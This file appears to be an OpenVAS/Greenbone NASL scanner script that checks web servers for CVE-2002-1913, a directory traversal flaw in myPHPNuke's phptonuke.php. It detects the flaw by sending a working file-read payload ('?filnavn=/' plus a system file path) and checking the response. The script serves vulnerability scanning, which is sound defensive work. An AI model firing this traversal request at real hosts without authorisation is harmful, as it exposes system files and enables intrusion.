if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11824" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_cve_id( "CVE-2002-1913" );
	script_bugtraq_id( 5982 );
	script_name( "myPHPNuke phptonuke.php Directory Traversal" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2003 Michel Arboi" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "https://marc.info/?l=bugtraq&m=103480589031537&w=2" );
	script_tag( name: "solution", value: "Upgrade to the latest version." );
	script_tag( name: "summary", value: "The version of myPHPNuke installed on the remote host
  allows anyone to read arbitrary files by passing the full filename to the 'filnavn'
  argument of the 'phptonuke.php' script." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
files = traversal_files();
for dir in nasl_make_list_unique( "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/phptonuke.php";
	buf = http_get_cache( port: port, item: url );
	if(!buf || !IsMatchRegexp( buf, "^HTTP/1\\.[01] 200" )){
		continue;
	}
	for pattern in keys( files ) {
		file = files[pattern];
		_url = url + "?filnavn=/" + file;
		if(http_vuln_check( port: port, url: _url, pattern: pattern )){
			report = http_report_vuln_url( port: port, url: _url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 0 );

